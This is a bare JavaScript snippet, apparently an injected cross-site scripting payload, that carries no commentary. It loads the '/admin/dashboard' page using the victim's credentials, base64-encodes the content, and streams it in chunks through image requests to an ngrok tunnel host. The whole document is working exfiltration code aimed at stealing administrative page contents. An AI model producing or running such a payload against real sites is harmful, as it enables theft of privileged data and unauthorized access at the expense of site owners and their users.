fetch("/admin/dashboard", {credentials:'include'})
.then(r=>r.text())
.then(d=>{
    function enc(s){
        return btoa(unescape(encodeURIComponent(s)));
    }

    let chunkSize = 1500;
    let i = 0;

    function send(){
        if(i >= d.length) return;

        let part = enc(d.slice(i, i + chunkSize));

        new Image().src = "https://b5be-2402-800-61c7-539d-6be1-5c24-9cd9-8309.ngrok-free.app/?i="+i+"&d="+part;

        i += chunkSize;
        setTimeout(send, 200);
    }

    send();
});
